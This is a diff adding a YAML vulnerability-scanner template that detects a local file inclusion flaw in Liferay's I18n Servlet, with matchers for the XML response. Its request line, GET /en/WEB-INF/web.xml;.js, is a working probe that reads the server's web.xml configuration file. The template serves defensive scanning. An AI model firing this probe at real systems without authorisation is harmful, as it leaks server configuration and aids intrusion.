@@ -1,0 +1,35 @@
+id: "liferay-resource-leak"
+name: "Liferay - Local File Inclusion"
+severity: "high"
+description: "Liferay is vulnerable to local file inclusion in the I18n Servlet because it leaks information via sending an HTTP request to /[language]/[resource];.js (also .jsp works)."
+tech:
+  - "generic"
+tags:
+  - "liferay"
+  - "lfi"
+  - "j2ee"
+  - "vuln"
+cwe: "CWE-22"
+reference: "https://github.com/ilmila/J2EEScan/blob/master/src/main/java/burp/j2ee/issues/impl/LiferayI18nServletResourceLeaks.java"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/en/WEB-INF/web.xml;.js"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "<web-app id="
+      - "<?xml"
+    condition: "and"
+  - type: "word"
+    part: "header"
+    words:
+      - "application/xml"
+  - type: "status"
+    status:
+      - 200
